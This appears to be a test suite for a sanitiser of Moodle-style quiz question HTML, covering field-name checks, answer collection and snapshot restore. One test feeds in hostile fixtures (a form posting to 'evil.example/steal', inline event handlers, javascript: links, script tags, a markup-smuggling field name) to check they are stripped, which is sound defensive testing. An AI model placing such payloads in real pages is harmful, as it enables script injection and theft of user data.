import test from 'node:test';
import assert from 'node:assert/strict';
import { setupDom } from './helpers/dom.js';
import { mcqHtml, tfHtml, shortHtml, numericalHtml } from './fixtures.js';

setupDom();
const { isValidFieldName, sanitizeQuestionHtml, collectAnswers, snapshotAnswers, restoreSnapshot } = await import('../src/qhtml.js');

const render = (html, opts) => {
  const box = document.createElement('div');
  box.innerHTML = sanitizeQuestionHtml(html, opts);
  return box;
};

test('isValidFieldName accepts Aules field names and rejects everything else', () => {
  for (const n of ['q5:1_answer', 'q5:1_:sequencecheck', 'q12:3_choice0', 'q5:1_clearchoice', 'q5:1_-submit']) assert.equal(isValidFieldName(n), true, n);
  for (const n of ['q5:1_:flagged', 'evil', 'q5_answer', 'q5:1_answer"><script>', '', 'sesskey', 'q5:1_', undefined]) assert.equal(isValidFieldName(n), false, String(n));
});

test('real-looking question markup keeps its answer controls, labels and text', () => {
  const box = render(mcqHtml());
  assert.equal(box.querySelectorAll('input[type=radio][name="q5:1_answer"]').length, 4); // three answers + Clear my choice (value -1)
  assert.ok(box.querySelector('input[type=hidden][name="q5:1_:sequencecheck"]'));
  assert.ok(box.querySelector('input[name="q5:1_answer"][value="-1"]'));
  assert.match(box.textContent, /What is the capital of Spain/);
  assert.ok(box.querySelector('label[for="q5:1_answer0"]'));
  assert.ok(box.querySelector('fieldset legend'));
  assert.ok(box.querySelector('.que.multichoice'));
  assert.ok(box.querySelector('input[type=text]') === null);
  assert.equal(render(shortHtml()).querySelectorAll('input[type=text][name="q7:3_answer"]').length, 1);
  assert.equal(render(numericalHtml()).querySelector('input[name="q8:4_answer"]').getAttribute('inputmode'), 'decimal');
  assert.equal(render(tfHtml()).querySelectorAll('input[type=radio]').length, 2);
});

test('flag controls are removed completely', () => {
  const out = sanitizeQuestionHtml(mcqHtml());
  assert.ok(!/flagged|questionflag|Flag question/.test(out));
});

test('hostile markup is neutralised', () => {
  const evil = `<form action="https://evil.example/steal" method="post"><input name="evil" value="x"></form>
    <div class="que evil-class correct" onclick="alert(1)" style="x:y"><input type="radio" name="q5:1_answer" value="0" id="q5:1_answer0" onclick="alert(2)">
    <input type="radio" name="sesskey" value="abc"><input type="hidden" name="q5:1_answer&quot;&gt;&lt;b&gt;" value="1">
    <input type="file" name="q5:1_upload"><input type="password" name="q5:1_pw"><input type="submit" name="q5:1_go" value="go">
    <input type="text" name="q5:1_x" id="evil-id" value="v"><label for="evil-id">bad</label><label for="q5:1_answer0">ok</label>
    <a href="javascript:alert(3)">js</a><a href="https://example.org/x">fine</a><img src="data:image/png;base64,AAAA"><img src="https://aules.edu.gva.es/fpa/webservice/pluginfile.php/1/a.png">
    <script>alert(4)</script><style>p{}</style><button>b</button><svg onload="x()"></svg><iframe src="https://e.com"></iframe></div>`;
  const out = sanitizeQuestionHtml(evil, { rewriteUrl: (u) => `${u}?T=1` });
  assert.ok(!/<form|onclick|style=|<script|<style|<svg|<iframe|<button|javascript:|data:image|evil\.example|sesskey|type="file"|type="password"|type="submit"|evil-id/.test(out), out);
  const box = document.createElement('div'); box.innerHTML = out;
  assert.equal(box.querySelector('.que').className, 'que correct'); // only allow-listed classes survive
  assert.ok(box.querySelector('input[name="q5:1_answer"]'));
  assert.ok(box.querySelector('input[name="q5:1_x"]')); // valid name, but its foreign id was dropped
  assert.equal(box.querySelector('input[name="q5:1_x"]').hasAttribute('id'), false);
  assert.equal(box.querySelector('label[for]').getAttribute('for'), 'q5:1_answer0');
  assert.ok(box.querySelector('a[href="https://example.org/x?T=1"][rel="noopener noreferrer"]'));
  assert.ok(box.querySelector('img[src="https://aules.edu.gva.es/fpa/webservice/pluginfile.php/1/a.png?T=1"]'));
  assert.equal(box.querySelectorAll('img').length, 1);
});

test('non-interactive mode (review) disables every control', () => {
  const box = render(mcqHtml() + shortHtml(), { interactive: false });
  const controls = [...box.querySelectorAll('input:not([type=hidden]), select, textarea')];
  assert.ok(controls.length >= 4);
  assert.ok(controls.every((c) => c.hasAttribute('disabled')));
  assert.equal(render(mcqHtml()).querySelector('input[type=radio]').hasAttribute('disabled'), false);
});

test('maths written as plain TeX text is preserved', () => {
  assert.match(sanitizeQuestionHtml('<div class="qtext"><p>Solve \\(x^2 = 4\\)</p></div>'), /\\\(x\^2 = 4\\\)/);
});

test('collectAnswers serialises like a browser form', () => {
  const box = render(mcqHtml(5, 1) + tfHtml(6, 2) + shortHtml(7, 3));
  assert.deepEqual(collectAnswers(box).map((a) => a.name).sort(), ['q5:1_:sequencecheck', 'q6:2_:sequencecheck', 'q7:3_:sequencecheck', 'q7:3_answer']);
  box.querySelector('input[name="q5:1_answer"][value="2"]').checked = true;
  box.querySelector('input[name="q6:2_answer"][value="0"]').checked = true;
  box.querySelector('input[name="q7:3_answer"]').value = 'casa';
  const a = collectAnswers(box);
  assert.deepEqual(a.filter((x) => x.name.endsWith('_answer')), [
    { name: 'q5:1_answer', value: '2' }, { name: 'q6:2_answer', value: '0' }, { name: 'q7:3_answer', value: 'casa' },
  ]);
  assert.ok(a.some((x) => x.name === 'q5:1_:sequencecheck' && x.value === '1'));
  assert.ok(!a.some((x) => /flagged/.test(x.name)));
});

test('collectAnswers handles checkboxes, selects, textareas, disabled controls and foreign names', () => {
  const box = document.createElement('div');
  box.innerHTML = `<input type="checkbox" name="q9:1_choice0" value="1" checked><input type="checkbox" name="q9:1_choice1" value="1">
    <select name="q9:2_answer"><option value="a">A</option><option value="b" selected>B</option></select>
    <textarea name="q9:3_answer">hola</textarea><input type="text" name="q9:4_answer" value="x" disabled>
    <input type="text" name="evil" value="y"><input type="hidden" name="q9:1_:flagged" value="0">
    <input type="checkbox" name="q9:5_choice0">`;
  box.querySelector('[name="q9:5_choice0"]').checked = true;
  assert.deepEqual(collectAnswers(box), [
    { name: 'q9:1_choice0', value: '1' }, { name: 'q9:2_answer', value: 'b' }, { name: 'q9:3_answer', value: 'hola' }, { name: 'q9:5_choice0', value: 'on' },
  ]);
});

test('snapshot and restore round-trip answers, including unchecking and never touching hidden fields', () => {
  const html = mcqHtml(5, 1) + shortHtml(7, 3);
  const first = render(html);
  first.querySelector('input[name="q5:1_answer"][value="1"]').checked = true;
  first.querySelector('input[name="q7:3_answer"]').value = 'casa';
  const snap = snapshotAnswers(first);
  assert.equal(JSON.parse(JSON.stringify(snap)).t['q7:3_answer'], 'casa');

  const second = render(html);
  second.querySelector('input[name="q5:1_answer"][value="0"]').checked = true; // server said "a"
  restoreSnapshot(second, snap);
  assert.equal(second.querySelector('input[name="q5:1_answer"][value="1"]').checked, true);
  assert.equal(second.querySelector('input[name="q5:1_answer"][value="0"]').checked, false);
  assert.equal(second.querySelector('input[name="q7:3_answer"]').value, 'casa');
  assert.equal(second.querySelector('input[name="q5:1_:sequencecheck"]').value, '1');

  const unchecked = snapshotAnswers(render(html)); // the student cleared everything
  const third = render(html);
  third.querySelector('input[name="q5:1_answer"][value="2"]').checked = true;
  restoreSnapshot(third, unchecked);
  assert.equal(third.querySelector('input[name="q5:1_answer"][value="2"]').checked, false);
  assert.doesNotThrow(() => restoreSnapshot(third, null));
  assert.doesNotThrow(() => restoreSnapshot(third, {}));
});

test('Moodle 4.x answer labels (aria-labelledby + a div) become real labels, so the text names and selects the radio', () => {
  const box = render(mcqHtml());
  const label = box.querySelector('label[for="q5:1_answer0"]');
  assert.ok(label);
  assert.match(label.textContent, /Madrid/);
  assert.equal(box.querySelector('[aria-labelledby]'), null);
  assert.equal(box.querySelector('[data-region]'), null);
  assert.equal(box.querySelector('input[name="q5:1_answer"][value="0"]').checked, false);
  label.click(); // tapping the text selects the answer
  assert.equal(box.querySelector('input[name="q5:1_answer"][value="0"]').checked, true);
});

test('an answer-label div whose id does not match its control is not turned into a label', () => {
  const box = render('<div data-region="answer-label" id="evil" class="x">hi</div><div data-region="answer-label" id="q5:1_answer0_label">ok</div>');
  assert.equal(box.querySelectorAll('label').length, 1);
  assert.equal(box.querySelector('label').getAttribute('for'), 'q5:1_answer0');
  assert.match(box.textContent, /hi/);
});

test('formatting that carries meaning survives in questions', () => {
  const out = sanitizeQuestionHtml('<p>Pick the <u>underlined</u> word, not the <s>old</s> <del>one</del> <ins>new</ins> <small>(hint)</small></p><hr><blockquote>quote</blockquote><table><caption>Table</caption><tr><td>1</td></tr></table>');
  for (const tag of ['u', 's', 'del', 'ins', 'small', 'hr', 'blockquote', 'caption']) assert.match(out, new RegExp('<' + tag + '[ >/]'), tag);
});
